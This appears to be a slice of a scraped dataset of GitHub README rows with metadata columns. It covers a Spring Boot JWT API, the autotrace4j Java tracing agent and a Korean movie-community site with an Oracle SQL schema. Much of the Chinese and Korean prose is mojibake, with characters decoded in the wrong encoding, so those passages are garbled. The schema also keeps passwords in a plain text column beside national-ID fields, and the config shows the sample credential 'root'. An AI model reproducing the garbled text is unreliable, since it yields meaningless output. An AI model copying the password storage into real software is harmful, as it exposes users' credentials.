      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/register</td>
      <td>Admin Register</td>
      <td>AdminRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/login</td>
      <td>Admin Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/refreshtoken</td>
      <td>Admin Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/admin/logout</td>
      <td>Admin Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>UserRegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refreshtoken</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 17
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose


### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd springbootsecurity
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd springbootsecurity
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd springbootsecurity
$ mvn clean install
$ mvn spring-boot:run
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/spring_1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/spring_2.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/spring_3.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/spring_4.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/spring_5.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/spring_6.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/spring_7.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/spring_8.PNG"">
    <p> Figure 9 </p>
    <img src =""screenshots/spring_9.PNG"">
    <p> Figure 10 </p>
    <img src =""screenshots/spring_10.PNG"">
    <p> Figure 11 </p>
    <img src =""screenshots/spring_11.PNG"">
    <p> Figure 12 </p>
    <img src =""screenshots/spring_12.PNG"">
    <p> Figure 13 </p>
    <img src =""screenshots/spring_13.PNG"">
    <p> Figure 14 </p>
    <img src =""screenshots/spring_14.PNG"">
    <p> Figure 15 </p>
    <img src =""screenshots/spring_15.PNG"">
    <p> Figure 16 </p>
    <img src =""screenshots/spring_16.PNG"">
</details>",0,0,1,0.0,"['spring', 'boot', 'spring', 'security', 'jwt', 'implementation', 'information', 'explore', 'rest', 'apis', 'technology', 'prerequisite', 'define', 'variable', 'file', 'docker', 'run', 'maven', 'run', 'screenshots']","['spring', 'run', 'boot', 'security', 'jwt']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.liquibase:liquibase-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
artlibs/autotrace4j,main,"## Auto Trace for Java
[![Run Tests](https://github.com/artlibs/autotrace4j/actions/workflows/testing.yml/badge.svg)](https://github.com/artlibs/autotrace4j/actions/workflows/testing.yml) [![Maven Central](https://maven-badges.herokuapp.com/maven-central/io.github.artlibs/autotrace4j/badge.svg)](https://maven-badges.herokuapp.com/maven-central/io.github.artlibs/autotrace4j/)  [![Release](https://img.shields.io/github/release/artlibs/autotrace4j.svg?style=flat-square)](https://github.com/artlibs/autotrace4j/releases)  [![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-blue.svg?style=flat)](https://www.apache.org/licenses/LICENSE-2.0)

â€‹	`autotrace4j`æ˜¯ä¸€ä¸ªåŸºäºByteBuddyç¼–å†™çš„è½»é‡çº§æ—¥å¿—è·Ÿè¸ªå·¥å…·ï¼Œå…¶åŸºæœ¬é€»è¾‘æ˜¯åœ¨å„ä¸ªä¸Šä¸‹æ–‡å½“ä¸­é€šè¿‡ä»£ç å¢å¼ºå…³é”®èŠ‚ç‚¹æ¥ä¼ é€’`trace id`ï¼Œæœ€ååœ¨æ—¥å¿—è¾“å‡ºæ—¶æ³¨å…¥åˆ°è¾“å‡ºç»“æœå½“ä¸­ï¼Œä»¥å®ç°æ—¥å¿—çš„è·Ÿè¸ªä¸²è”ã€‚

â€‹	æˆ‘ä»¬å€Ÿé‰´äº†SkyWalkingçš„å®ç°åŸç†ï¼Œä½¿ç”¨ByteBuddyåœ¨å„ä¸ªä¸Šä¸‹æ–‡ç¯èŠ‚è¿›è¡Œå…³é”®ç‚¹å¢å¼ºæ¥ä¼ é€’Trace IDã€‚

#### æ˜“ä½¿ç”¨

â€‹	åŸºäºAgentçš„æ–¹å¼æ¥ä½¿ç”¨è¯¥å·¥å…·ï¼Œå¯¹ä¸šåŠ¡ä»£ç æ— ä¾µå…¥ã€‚

#### è½»é‡çº§

â€‹	åªä¾èµ–ByteBuddyï¼Œä¸”å¢åŠ çš„å¢å¼ºä»£ç åªæ˜¯å¾€Thread Localå½“ä¸­å†™å…¥å­—ç¬¦ä¸²æˆ–è¯»å‡ºå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰åšé¢å¤–äº‹é¡¹ï¼Œä¸ä¼šå¢åŠ æ€§èƒ½å¼€é”€ã€‚

## Startup

â€‹	`autotrace4j`çš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œåªéœ€ä»[release](https://github.com/artlibs/autotrace4j/releases)ä¸­ä¸‹è½½æœ€æ–°çš„agent jaråŒ…ï¼Œåœ¨å¯åŠ¨è„šæœ¬ä¸­ä»¥agentæ–¹å¼è¿è¡Œï¼š

```shell
$ java -javaagent=/dir/to/autotrace4j.jar=com.your-domain.biz1.pkg1,com.your-domain.biz2.pkg2 -jar YourJar.jar  # çœç•¥å…¶ä»–æ— å…³å‚æ•°
```

#### å…³äº`org.slf4j.MDC`

å¯é€šè¿‡slf4jçš„MDCè·å–å½“å‰ä¸Šä¸‹æ–‡çš„TraceIDï¼š

-   å½“é€šè¿‡ `MDC.get(""X-Ato-Span-Id"")`æ—¶è¿”å›å½“å‰ä¸Šä¸‹æ–‡çš„ `SpanId`
-   å½“é€šè¿‡ `MDC.get(""X-Ato-P-Span-Id"")`æ—¶è¿”å›å½“å‰ä¸Šä¸‹æ–‡çš„ `ParentSpanId`
-   å½“é€šè¿‡ `MDC.get(""X-Ato-Trace-Id"")`æ—¶è¿”å›å½“å‰ä¸Šä¸‹æ–‡çš„ `TraceId`

## Supported Context

### 1ã€Thread

â€‹	é’ˆå¯¹Threadè¿›è¡Œäº†å¢å¼ºï¼Œåœ¨åˆ›å»ºçº¿ç¨‹æ—¶æ”¯æŒè‡ªåŠ¨Traceè·Ÿè¸ª:

-   `java.lang.Thread`

### 2ã€Thread Pool

â€‹	åŸºäºå¦‚ä¸‹åŒ…ä½œä¸ºåŸºç¡€çš„çº¿ç¨‹æ± å‡æ”¯æŒè‡ªåŠ¨Traceè·Ÿè¸ª:

-   `java.util.concurrent.ThreadPoolExecutor`
-   `java.util.concurrent.ForkJoinPool`
-   `java.util.concurrent.ScheduledThreadPoolExecutor`

### 3ã€Http Client

â€‹	åŸºäºå¦‚ä¸‹å‡ ä¸ªClientçš„HTTPè¯·æ±‚å®¢æˆ·ç«¯åœ¨å‘é€è¯·æ±‚æ—¶éƒ½ä¼šè‡ªåŠ¨å°†å½“å‰ä¸Šä¸‹æ–‡çš„TraceIdè®¾ç½®åˆ°è¯·æ±‚å¤´ï¼š

-   OkHttp3ï¼š`com.squareup.okhttp3:okhttp`
-   JDK Http Clientï¼š`jdk:sun.net.www.http.HttpClient`
-   ApacheHttpClientï¼š`org.apache.httpcomponents:httpclient`

### 4ã€Http Servlet

â€‹	æˆ‘ä»¬æ”¯æŒäº†HTTP Filterå’ŒHTTP Servletæ¥ä»è¯·æ±‚å¤´å½“ä¸­æ¥æ”¶TraceIdå¹¶è®¾ç½®åˆ°å½“å‰ä¸Šä¸‹æ–‡ï¼š

-   `javax.servlet.Filter`
-   `javax.servlet.http.HttpServlet`

### 5ã€MessageQunue

â€‹	ç›®å‰æ”¯æŒé˜¿é‡Œäº‘ONSå’ŒRocketMQåœ¨ç”Ÿäº§å’Œæ¶ˆè´¹æ—¶å¸¦ä¸ŠTraceIdï¼š

-   RocektMQï¼š`Producer` & `Consumer`
-   Aliyun ONSï¼š`Producer` & `Consumer`
-   Kafkaï¼šcomming soon....

### 6ã€Scheduled Task

â€‹	å·²æ”¯æŒXXL Jobå’ŒSpringçš„Scheduledå®šæ—¶ä»»åŠ¡åœ¨äº§ç”Ÿæ—¶ç”ŸæˆTraceIdï¼š

-   XxlJob Handlerï¼š`com.handler.com.xxl.job.core.IJobHandler`
- Spring Schedule Taskï¼š`org.springframework.scheduling.annotation.Scheduled`
- PowerJob Processorï¼š`tech.powerjob.worker.core.processor.sdk.BasicProcessor`

### 7ã€Logging

â€‹	ç›®å‰æ”¯æŒåœ¨logbackä¸­è¾“å‡ºæ—¥å¿—æ—¶æ³¨å…¥trace idè¿›è¡Œè¾“å‡ºï¼š

-   logbackï¼š`ch.qos.logback:logback-core`

## Contribute

æ¬¢è¿è´¡çŒ®ä½ çš„ä»£ç ï¼Œä¸€èµ·å®Œå–„`autotrace4j`åº“ï¼
",2,0,1,13.0,"['auto', 'trace', 'java', 'startup', 'support', 'context', 'pool', 'client', 'servlet', 'task', 'contribute']","['auto', 'trace', 'java', 'startup', 'support']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
krkarma777/moonbam,master,"# ë¬¸í™”ì¸ë“¤ì˜ ë°¤


![image](https://github.com/krkarma777/moonbam/assets/149022496/ba3609c4-3f24-480f-a11b-1fc2fd986ad2)

![image](https://github.com/krkarma777/moonbam/assets/149022496/d085314f-8152-476f-8428-64106c5ba51a)

ë¬¸í™”ì¸ë“¤ì˜ ë°¤ì€ ì˜í™” ì»¤ë®¤ë‹ˆí‹° í”Œë«í¼ì„ ì œê³µí•˜ëŠ” í”„ë¡œì íŠ¸ë¡œ, ì‚¬ìš©ìë“¤ì´ ì˜í™”ì— ëŒ€í•´ í† ë¡ í•˜ê³  ì •ë³´ë¥¼ ê³µìœ í•  ìˆ˜ ìˆëŠ” ê³µê°„ì…ë‹ˆë‹¤. ë°±ì—”ë“œëŠ” Javaì™€ Spring Bootë¥¼ ì‚¬ìš©í•˜ì˜€ê³ , í”„ë¡ íŠ¸ì—”ë“œëŠ” HTML, CSS, JavaScriptë¡œ êµ¬í˜„ë˜ì—ˆìŠµë‹ˆë‹¤.

## ì‹œì‘í•˜ê¸°

ì´ ì„¹ì…˜ì—ì„œëŠ” í”„ë¡œì íŠ¸ë¥¼ ë¡œì»¬ í™˜ê²½ì—ì„œ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…í•©ë‹ˆë‹¤.

<hr>

### í”„ë¡œê·¸ë˜ë° ì–¸ì–´ ë° ê°œë°œ í™˜ê²½
- **Java**: JDK 17ì„ ì‚¬ìš©í•˜ì—¬ ë°±ì—”ë“œ ë¡œì§ì„ êµ¬í˜„.
- **Spring Boot**: ëª¨ë˜ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê°œë°œì„ ìœ„í•œ í”„ë ˆì„ì›Œí¬, ë¹ ë¥¸ ê°œë°œê³¼ ê°„í¸í•œ ë°°í¬ ì œê³µ.
- **JSP/Servlet**: ë™ì  ì›¹ í˜ì´ì§€ ìƒì„±ê³¼ ì„œë²„ ì‚¬ì´ë“œ ë¡œì§ ì²˜ë¦¬.
- **JavaScript/CSS/HTML**: í”„ë¡ íŠ¸ì—”ë“œ ì¸í„°í˜ì´ìŠ¤ êµ¬í˜„.

### ë°ì´í„°ë² ì´ìŠ¤
- **Oracle 11g**: ë°ì´í„° ì €ì¥ê³¼ ê´€ë¦¬ë¥¼ ìœ„í•œ ê´€ê³„í˜• ë°ì´í„°ë² ì´ìŠ¤ ì‹œìŠ¤í…œ.

### ORM ë° ë°ì´í„° ì•¡ì„¸ìŠ¤
- **MyBatis**: SQL ë§¤í•‘ í”„ë ˆì„ì›Œí¬ë¡œ ë°ì´í„°ë² ì´ìŠ¤ì™€ ê°ì²´ê°„ì˜ ë§¤í•‘ ì²˜ë¦¬.

### í˜‘ì—… ë„êµ¬
- **Asana**: í”„ë¡œì íŠ¸ ê´€ë¦¬ ë° íŒ€ ì‘ì—…ì˜ ì¼ì • ê´€ë¦¬.
- **Slack**: íŒ€ ì»¤ë®¤ë‹ˆì¼€ì´ì…˜ì„ ìœ„í•œ ë©”ì‹œì§• í”Œë«í¼.
- **Discord**: ì‹¤ì‹œê°„ ìŒì„± ë° í…ìŠ¤íŠ¸ ê¸°ë°˜ ì»¤ë®¤ë‹ˆì¼€ì´ì…˜ ë„êµ¬.

### ë²„ì „ ê´€ë¦¬ ë° ì½”ë“œ ë¦¬í¬ì§€í† ë¦¬
- **Git**: ì†ŒìŠ¤ ì½”ë“œ ë²„ì „ ê´€ë¦¬.
- **GitHub/GitLab**: ì½”ë“œ í˜¸ìŠ¤íŒ… ë° íŒ€ì› ê°„ì˜ ì½”ë“œ ë¦¬ë·°, ë¨¸ì§€ ìš”ì²­ ë° ì´ìŠˆ íŠ¸ë˜í‚¹ì„ ì§€ì›.

### ê¸°íƒ€ ë„êµ¬ ë° ë¼ì´ë¸ŒëŸ¬ë¦¬
- **Apache Tomcat**: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì„œë²„ë¡œ ì„œë¸”ë¦¿ê³¼ JSP ì‹¤í–‰ í™˜ê²½ ì œê³µ.
- **Maven**: í”„ë¡œì íŠ¸ ì˜ì¡´ì„± ê´€ë¦¬ ë° ë¹Œë“œ ìë™í™” ë„êµ¬.

<hr>

### ì„¤ì¹˜

1. í”„ë¡œì íŠ¸ í´ë¡ :
   ```bash
   git clone https://github.com/yourusername/cultural-night.git
   ```
2. í•„ìš”í•œ Java ë¼ì´ë¸ŒëŸ¬ë¦¬ ì„¤ì¹˜:

   ```
   mvn install
   ```

 ## ì‹¤í–‰í•˜ê¸°  

 1. Spring Boot ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹¤í–‰:
   ```
   mvn spring-boot:run
   ```
 2. ë¸Œë¼ìš°ì €ì—ì„œ ë‹¤ìŒ URLë¡œ ì ‘ì†:
   ```
   http://localhost:8090/acorn
   ```

 ## êµ¬ì„±

 ### ì£¼ìš” ì„¤ì • íŒŒì¼
application.properties ì„¤ì • ì˜ˆì‹œ:
```
server.port=8090
spring.datasource.url=jdbc:oracle:thin:@localhost:1521:xe
spring.datasource.username=acorn
spring.datasource.password=root
spring.mvc.view.prefix=/WEB-INF/views/
spring.mvc.view.suffix=.jsp
spring.mvc.static-path-pattern=/resources/**
spring.profiles.active=dev
jwt.expiredMs=3600000
```

 ## ê¸°ëŠ¥
ë¬¸í™”ì¸ë“¤ì˜ ë°¤ì€ ë‹¤ìŒê³¼ ê°™ì€ ì£¼ìš” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤:

 ### ì˜í™” ì •ë³´ ê³µìœ 
- ì‚¬ìš©ì ê°„ì˜ í† ë¡  ë° ì˜ê²¬ êµí™˜
- ì˜í™” í‰ì  ë° ë¦¬ë·° ì‘ì„±
- ì˜í™” ì»¤ë®¤ë‹ˆí‹° ê²Œì‹œíŒ
- ê´€ë¦¬ì ê´€ë¦¬ í˜ì´ì§€
- ë§ˆì´í˜ì´ì§€
- ì†Œëª¨ì„(ì±„íŒ…)
 ## ë§ˆì´ê·¸ë ˆì´ì…˜ ì•ˆë‚´
2024ë…„ 4ì›” ì´ˆ, Spring Boot 3.x ë²„ì „ìœ¼ë¡œ ë§ˆì´ê·¸ë ˆì´ì…˜ ì˜ˆì •ì…ë‹ˆë‹¤.

 ## SQL   
```
---- ì‚¬ìš©ì (memberDB) í…Œì´ë¸”
CREATE TABLE memberDB (
    userId VARCHAR2(50) PRIMARY KEY,
    userPw VARCHAR2(50) NOT NULL CHECK (LENGTHB(userPw) >= 4),
    userName VARCHAR2(30) NOT NULL CHECK (LENGTHB(userName) >= 2),
    userSSN1 VARCHAR2(10),
    userSSN2 VARCHAR2(10),
    userGender VARCHAR2(20) CHECK (userGender IN ('male', 'female')),
    nickname VARCHAR2(30) UNIQUE,
    userPhoneNum1 VARCHAR2(3),
    userPhoneNum2 VARCHAR2(4),
    userPhoneNum3 VARCHAR2(4),
    userEmailId VARCHAR2(50) NOT NULL,
    userEmailDomain VARCHAR2(50) NOT NULL,
    userSignDate VARCHAR2(10) DEFAULT TO_CHAR(SYSDATE, 'yyyy/MM/dd') NOT NULL,
    userType VARCHAR2(1) DEFAULT '1' CHECK (userType IN ('0', '1', '2', '3', '4')) -- 0 for admin, 1 for member, default is member
);

--ë””ë²„ê·¸ ê²Œì‹œíŒDB ìƒì„±
create table debugBoardDB (
 BOARDNUM Number(10) primary key,
 NICKNAME VARCHAR2(20) NOT NULL,
 PASSWORD Varchar2(20),
 TITLE VARCHAR2(200) NOT NULL,
 CATEGORY VARCHAR2(20) NOT NULL,
 CONTENT VARCHAR2(2000) NOT NULL,
 POSTDATE VARCHAR2(30) NOT NULL,
 EDITTEDDATE VARCHAR2(30),
 VIEWCOUNT NUMBER(20) DEFAULT 0 NOT NULL,
 RECOMMENDNUM   NUMBER(20) DEFAULT 0 NOT NULL,
 DISRECOMMENDNUM  NUMBER(20) DEFAULT 0 NOT NULL
);

---- ê°ë…,ì €ì (producerDB) í…Œì´ë¸”
CREATE TABLE producerDB (
   producerId NUMBER PRIMARY KEY,
   producerName VARCHAR(255) NOT NULL
);
-- ê°ë…ë°ì´í„° ì‚½ì…
insert into producerdb values (1, 'test');
commit;

---- ì‘í’ˆ (ì»¨í…ì¸ )(contentDB) í…Œì´ë¸”
CREATE TABLE contentDB (
    contId NUMBER PRIMARY KEY,
    contTitle VARCHAR2(255) NOT NULL,
    producerId NUMBER,
    description CLOB,
    nation VARCHAR2(20),
    releaseDate DATE,
    avgRate NUMBER(2, 1),
    contType VARCHAR2(20) NOT NULL,
    contImg VARCHAR2(500),
    CONSTRAINT contType_check CHECK (contType IN ('movie', 'book', 'tv_show', 'tv_drama')),
    CONSTRAINT contentDB_producerId_fk FOREIGN KEY (producerId) REFERENCES producerDB(producerId)
);
-- ì»¨í…ì¸  ë°ì´í„° ì‚½ì…
insert into contentdb values (1, 'ìŠ¤ì¦ˆë©”ì˜ ë¬¸ë‹¨ì†', 1, 'â€œì´ ê·¼ì²˜ì— íí—ˆ ì—†ë‹ˆ? ë¬¸ì„ ì°¾ê³  ìˆì–´â€
ê·œìŠˆì˜ í•œì í•œ ë§ˆì„ì— ì‚´ê³  ìˆëŠ” ì†Œë…€ â€˜ìŠ¤ì¦ˆë©”â€™ëŠ” ë¬¸ì„ ì°¾ì•„ ì—¬í–‰ ì¤‘ì¸ ì²­ë…„ â€˜ì†Œíƒ€â€™ë¥¼ ë§Œë‚œë‹¤. ê·¸ì˜ ë’¤ë¥¼ ì«“ì•„ ì‚°ì† íí—ˆì—ì„œ ë°œê²¬í•œ ë‚¡ì€ ë¬¸. ìŠ¤ì¦ˆë©”ê°€ ë¬´ì–¸ê°€ì— ì´ëŒë¦¬ë“¯ ë¬¸ì„ ì—´ì ë§ˆì„ì— ì¬ë‚œì˜ ìœ„ê¸°ê°€ ë‹¥ì³ì˜¤ê³  ê°€ë¬¸ ëŒ€ëŒ€ë¡œ ë¬¸ ë„ˆë¨¸ì˜ ì¬ë‚œì„ ë´‰ì¸í•˜ëŠ” ì†Œíƒ€ë¥¼ ë„ì™€ ê°„ì‹ íˆ ë¬¸ì„ ë‹«ëŠ”ë‹¤.
â€œë‹«ì•„ì•¼ë§Œ í•˜ì–ì•„ìš”, ì—¬ê¸°ë¥¼!â€
ì¬ë‚œì„ ë§‰ì•˜ë‹¤ëŠ” ì•ˆë„ê°ë„ ì ì‹œ, ìˆ˜ìˆ˜ê»˜ë¼ì˜ ê³ ì–‘ì´ â€˜ë‹¤ì´ì§„â€™ì´ ë‚˜íƒ€ë‚˜ ì†Œíƒ€ë¥¼ ì˜ìë¡œ ë°”ê¿” ë²„ë¦¬ê³  ì¼ë³¸ ê°ì§€ì˜ íí—ˆì— ì¬ë‚œì„ ë¶€ë¥´ëŠ” ë¬¸ì´ ì—´ë¦¬ê¸° ì‹œì‘í•˜ì ìŠ¤ì¦ˆë©”ëŠ” ì˜ìê°€ ëœ ì†Œíƒ€ì™€ í•¨ê»˜ ì¬ë‚œì„ ë§‰ê¸° ìœ„í•œ ì—¬ì •ì— ë‚˜ì„ ë‹¤.
â€œê¿ˆì´ ì•„ë‹ˆì—ˆì–´â€
ê·œìŠˆ, ì‹œì½”ì¿ , ê³ ë² , ë„ì¿„. ì¬ë‚œì„ ë§‰ê¸° ìœ„í•´ ì¼ë³¸ ì „ì—­ì„ ëŒë©° í•„ì‚¬ì ìœ¼ë¡œ ë¬¸ì„ ë‹«ì•„ê°€ë˜ ì¤‘ ì–´ë¦´ ì  ê³ í–¥ì— ë‹¿ì€ ìŠ¤ì¦ˆë©”ëŠ” ìŠê³  ìˆë˜ ì§„ì‹¤ê³¼ ë§ˆì£¼í•˜ê²Œ ë˜ëŠ”ë°â€¦', 'í•œêµ­', sysdate, null, 'movie',
'https://an2-img.amz.wtchn.net/image/v2/T7qP_idp-A7AdHCV6-wZBA.jpg?jwt=ZXlKaGJHY2lPaUpJVXpJMU5pSjkuZXlKdmNIUnpJanBiSW1SZk5Ea3dlRGN3TUhFNE1DSmRMQ0p3SWpvaUwzWXlMM04wYjNKbEwybHRZV2RsTHpFMk56VTJOVE16TlRNNE9EVTVNVEEyTURVaWZRLmZxSThtNU1jQl9HSDFxQ0plZGlUYUxPa1R4WTVwSC1kZGhNWVhISy16anM');
commit;

---- ë³„ì  (rateDB) í…Œì´ë¸”
CREATE TABLE rateDB (
    userId VARCHAR2(20),
    contId NUMBER,
    score NUMBER(2, 0) DEFAULT 0, 
    CONSTRAINT rateDB_userId_fk FOREIGN KEY (userId) REFERENCES memberDB(userId),
    CONSTRAINT rateDB_contId_fk FOREIGN KEY (contId) REFERENCES contentDB(contId) ON DELETE CASCADE,
    CONSTRAINT rateDB_pk PRIMARY KEY(userId, contId)
);

---- ê²Œì‹œê¸€ ë§ë¨¸ë¦¬ (PostCategories) í…Œì´ë¸”
CREATE TABLE PostCategories (
    categoryId INT PRIMARY KEY,
    categoryName VARCHAR2(255) NOT NULL,
    description CLOB,
    createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updatedAt TIMESTAMP
);
-- ê²Œì‹œê¸€ ë§ë¨¸ë¦¬ ë°ì´í„° ì‚½ì…
INSERT INTO postcategories (CATEGORYID, CATEGORYNAME, DESCRIPTION, CREATEDAT) VALUES (1, 'ì¼ë°˜', 'ì˜í™”>ììœ >ì¼ë°˜', TO_TIMESTAMP('24/02/05 18:12:26.221000000', 'RR/MM/DD HH24:MI:SS.FF'));
INSERT INTO postcategories (CATEGORYID, CATEGORYNAME, DESCRIPTION, CREATEDAT) VALUES (2, 'ì‹ ì‘', 'ì˜í™”>ììœ >ì‹ ì‘', TO_TIMESTAMP('24/02/05 18:12:26.226000000', 'RR/MM/DD HH24:MI:SS.FF'));
INSERT INTO postcategories (CATEGORYID, CATEGORYNAME, DESCRIPTION, CREATEDAT) VALUES (3, 'í›„ê¸°', 'ì˜í™”>ììœ >í›„ê¸°', TO_TIMESTAMP('24/02/05 18:12:26.228000000', 'RR/MM/DD HH24:MI:SS.FF'));
INSERT INTO postcategories (CATEGORYID, CATEGORYNAME, DESCRIPTION, CREATEDAT) VALUES (4, 'ì¶”ì²œ', 'ì˜í™”>ììœ >ì¶”ì²œ', TO_TIMESTAMP('24/02/05 18:12:26.228000000', 'RR/MM/DD HH24:MI:SS.FF'));
INSERT INTO postcategories (CATEGORYID, CATEGORYNAME, DESCRIPTION, CREATEDAT) VALUES (5, 'í† ë¡ ', 'ì˜í™”>ììœ >í† ë¡ ', TO_TIMESTAMP('24/02/05 18:12:26.229000000', 'RR/MM/DD HH24:MI:SS.FF'));
INSERT INTO postcategories (CATEGORYID, CATEGORYNAME, DESCRIPTION, CREATEDAT) VALUES (6, 'í•´ì™¸', 'ì˜í™”>ììœ >í•´ì™¸', TO_TIMESTAMP('24/02/05 18:12:39.342000000', 'RR/MM/DD HH24:MI:SS.FF'));
commit;

---- ê²Œì‹œë¬¼ ê¸€ (postDB) í…Œì´ë¸”
CREATE TABLE postDB (
    postId NUMBER(5, 0) PRIMARY KEY,
    postBoard VARCHAR(20) NOT NULL,
    userId VARCHAR2(20) ,
    contId NUMBER(5, 0),
    postTitle VARCHAR(50) NOT NULL,
    postDate DATE DEFAULT SYSDATE,
    postEditDate DATE,
    postText CLOB NOT NULL,
    nickname VARCHAR(20) NOT NULL,
    categoryId NUMBER(38,0),
    CONSTRAINT postDB_userId_fk FOREIGN KEY (userId) REFERENCES memberDB(userId),
    CONSTRAINT fk_post_categories FOREIGN KEY (categoryId) REFERENCES PostCategories (categoryId)
);

---- ê²Œì‹œë¬¼ ì¡°íšŒìˆ˜ (postInfoDB) í…Œì´ë¸”
CREATE TABLE postInfoDB (
postId NUMBER(5, 0),
viewNum NUMBER(5, 0) DEFAULT 0,
CONSTRAINT postInfoDB_postId_fk FOREIGN KEY (postId) REFERENCES postDB(postId) ON DELETE CASCADE
);

---- ê²Œì‹œë¬¼ ì¢‹ì•„ìš”ìˆ˜ (likDB) í…Œì´ë¸”
CREATE TABLE likeDB (
    postId NUMBER(5, 0),
    userId VARCHAR2(20),
    isLike char(1) DEFAULT 0 CHECK (isLike IN (0, 1)), -- 1ì´ ê³µê°ë²„íŠ¼ ëˆ„ë¥¸ ìƒíƒœ ()
    CONSTRAINT likeDB_userId_fk FOREIGN KEY (userId) REFERENCES memberDB(userId),
    CONSTRAINT likeDB_postId_fk FOREIGN KEY (postId) REFERENCES postDB(postId) ON DELETE CASCADE,
    CONSTRAINT likeDB_pk PRIMARY KEY(userId, postId)
);

---- ëŒ“ê¸€ (commentDB) í…Œì´ë¸”
CREATE TABLE commentDB (
    comId NUMBER(5, 0) PRIMARY KEY,
    postId NUMBER(5, 0),
    userId VARCHAR2(20),
    comDate DATE DEFAULT SYSDATE,
    comText CLOB NOT NULL,
    aboveCom NUMBER(5, 0),
    nickname VARCHAR2(20),
    aboveComId NUMBER(5, 0),
    CONSTRAINT commentDB_postId_fk FOREIGN KEY (postId) REFERENCES postDB(postId) ON DELETE CASCADE,
    CONSTRAINT commentDB_userId_fk FOREIGN KEY (userId) REFERENCES memberDB(userId)
);

---- ê²Œì‹œê¸€ ì„ì‹œì €ì¥ (postSaveDB) í…Œì´ë¸”
CREATE TABLE postSaveDB (
    postSaveId NUMBER(5, 0) PRIMARY KEY,
    userId VARCHAR2(20),
    postSaveTitle VARCHAR(50) NOT NULL,
    postSaveText CLOB NOT NULL,
    postSaveDate DATE DEFAULT SYSDATE,
    CONSTRAINT postSaveDB_userId_fk FOREIGN KEY (userId) REFERENCES memberDB(userId)
);

---- ìª½ì§€ê¸°ëŠ¥ (messages) í…Œì´ë¸”
CREATE TABLE Messages (
    MessageID NUMBER PRIMARY KEY,
    SenderID VARCHAR2(20 BYTE) REFERENCES MemberDB(USERID),
